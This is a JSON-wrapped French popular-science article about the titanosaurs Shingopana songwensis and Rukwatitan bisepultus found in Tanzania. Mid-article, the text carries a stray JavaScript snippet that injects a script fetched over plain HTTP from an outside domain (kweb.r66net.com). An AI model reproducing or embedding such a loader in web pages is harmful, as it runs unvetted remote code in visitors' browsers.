{"title": "Un nouveau titanosaure découvert en Tanzanie", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "30/08/2017", "content": "Shingopana songwensis  : c'est le nom d'un nouveau titanosaure découvert en Tanzanie et qui vivait il y a plus de 70 millions d'années. Ce dinosaure herbivore au long cou avait la taille d'un orque. Ce qu'il faut retenir Peu de titanosaures, ces sauropodes herbivores, ont été découverts en Afrique, par comparaison avec d'autres régions, comme l'Argentine. Toute nouvelle découverte peut donc nous aider à mieux comprendre ce qui s'est passé sur ce continent à l'époque des dinosaures. Une équipe de paléontologues vient d'annoncer la découverte et l'identification d'un second titanosaure en Tanzanie qui vécut pendant le Crétacé supérieur. Son nom :  Shingopana songwensis . Entre la découverte de fossiles et la publication d'un article dans une revue scientifique, il peut s'écouler de longues années. En voici un nouvel exemple avec un article tout juste paru dans  Journal of Vertebrate Paleontology  décrivant un nouveau titanosaure trouvé en Afrique et découvert... en 2002. Il a fallu en effet plusieurs années pour extraire du sol ses restes fossilisés.  Le nouveau venu est tanzanien et il s'appelle  Shingopana songwensis . Les lois de la biomécanique indiquent qu'il devait peser environ 5 tonnes, c'est-à-dire le poids de deux ou trois voitures, qu'il était long 8 m et que son cou pouvait élever sa tête jusqu'à une hauteur de 4 m. Des caractéristiques impressionnantes mais pas autant que celles de ses cousins qui vivaient en Argentine, tel le  Patagotitan mayorum . Les paléontologues sur le terrain en Tanzanie. Ils se préparent à plâtrer un os de titanosaure. © Nancy Stevens                               Un titanosaure africain mais proche des titanosaures sud-américain Les roches dans lesquelles ont été découverts les os de  Shingopana songwensis  sont vieilles de 70 à 100 millions d'années, ce qui correspond au  Crétacé . Son nom de genre répond à son allure :  shingo  et  pana  signifient respectivement en swahili, la langue de la Tanzanie, « cou » et « large ». Quant à «  songwensis , le mot, qui désigne l'espèce, fait référence à la région de la découverte : la vallée du grand  rift  d'Afrique de l'Est, mondialement célèbre dans le domaine de la paléontologie humaine et de la volcanologie pour abriter  Dallol  et l' Ol Doinyo Lengaï .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Shingopana songwensis  n'est pas le premier titanosaure découvert en Afrique, ni même en Tanzanie, comme l'explique l'article ci-dessous. Au Crétacé, les titanosaures étaient d'ailleurs répandus sur tous les continents (rappelons tout de même que les continents de cette époque n'avaient pas la même forme ni la même répartition qu'aujourd'hui du fait de la dérive des continents). Or, l'étude des os fossilisés a révélé qu'il avait davantage de points en commun avec les titanosaures d'Amérique du Sud qu'avec ceux découverts en Afrique, comme par exemple  Rukwatitan bisepultus  exhumé en Tanzanie par la même équipe de paléontologues en 2014. Selon Patrick O'Connor, professeur d'anatomie en poste à l'université de l'Ohio et qui a participé à l'étude de  Shingopana songwensis  :  « Nous ne faisons encore que gratter la surface pour ce qui est de notre compréhension de la diversité des organismes et des environnements dans lesquels ils vivaient sur le continent africain pendant le Crétacé supérieur » . Pour en savoir plus Un nouveau titanosaure découvert, cette fois, en Afrique Article de Laurent Sacco publié le 11/09/2014 Bien des  espèces  de  dinosaures  restent encore à découvrir. Les titanosaures africains du Crétacé sont par exemple très mal connus. D'où l'importance de la découverte de  Rukwatitan bisepultus  en Tanzanie, qui éclaire l'histoire de cette grande famile, au moment où elle prospérait. Il y a environ 145 millions d'années, au début du Crétacé, l'Afrique était en cours de séparation d'avec l'Amérique du Sud. Les espèces de dinosaures des deux continents étaient donc sur le point de devenir  endémiques . On connaît beaucoup de restes de dinosaures datant du Crétacé en Afrique du nord mais moins en Afrique du Sud. Le  Maroc  est par exemple un paradis pour les paléontologues. On peut citer aussi le Niger où l'on a découvert entre autres  Nigersaurus taqueti . Mais, alors que plus de 30 espèces de titanosaures ont été trouvées en Amérique du Sud, comme le  Dreadnoughtus schrani , l'Afrique n'en avait fourni qu'une poignée. Un groupe de paléontologues états-uniens vient pourtant d'annoncer dans un article publié par le  Journal of Vertebrate Paleontology  la découverte d'un nouveau titanosaure  herbivore  dans le sud-ouest de la Tanzanie. Les restes fossilisés de l'animal, baptisé  Rukwatitan bisepultus , ont été retrouvés dans le Grand Rift africain, plus précisément dans le  bassin  associé au lac Rukwa. Les couches sédimentaires affleurant à flanc de falaise dans lesquelles des vertèbres, des côtes et des membres ont été extraits au cours de deux saisons de fouilles sont âgées d'environ 100 millions d'années. Elles datent donc du Crétacé moyen. Cette vidéo montre les campagnes de fouilles des paléontologues en Tanzanie sur le site où ont été retrouvés les restes fossilisés du nouveau titanosaure. Même s'il ne bat pas de record de masse ou de taille, ce dinosaure devrait nous permettre de mieux connaître l'évolution des titanosaures en Afrique, qui est très mal connue en comparaison de ceux qui vivaient en Amérique du Sud. ©  National Science Foundation , YouTube Une fenêtre sur l'évolution des titanosaures africains L'étude des os fossilisés, notamment au moyen d'un  scanner  à  rayons X , ont permis de comparer  Rukwatitan bisepultus  aux autres titanosaures. Il a même été possible de le replacer dans l' arbre phylogénétique  des  sauropodes . Les paléontologues ont par exemple constaté des points communs avec  Malawisaurus dixeyi  qui, comme son nom l'indique, avait été découvert au Malawi. Mais pour eux, il s'agit bien de deux espèces distinctes, différant elles-mêmes des autres titanosaures découverts en Afrique du Nord. Le  dinosaure  tanzanien devait probablement peser autant que quelques éléphants et, d'après les chercheurs, ses membres devaient atteindre jusqu'à 2 mètres. Actuellement, l'essentiel de ce que l'on sait sur les titanosaures provient de l'étude des restes fossilisés trouvés en Amérique du Sud. Cette découverte contribue donc à élargir notre connaissance de ces animaux en montrant comment ils s'adaptaient à des niches écologiques et géographiques différentes. Elle devrait nous aider à mieux comprendre non seulement l' évolution des espèces  en Afrique sub-saharienne au Crétacé mais aussi pourquoi les titanosaures semblent s'être diversifiés au moment où leurs cousins, les Diplodocidés, étaient en train de disparaître. Ils formaient une famille de dinosaures sauropodes de très grandes tailles ayant vécu au  Jurassique  supérieur dans ce qui est actuellement l'Afrique, l'Amérique du Nord et l'Europe. Titanosaure : le plus grand dinosaure du monde s’expose en time-laspe                       Un fossile de titanosaure d'un poids de 70 tonnes a été découvert en 2014 en Patagonie, en Argentine. Il est exposé pour la première fois au Muséum américain d’histoire naturelle, à New York. Découvrez son assemblage en vidéo et en time-lapse.                                       ", "theme": "planete"}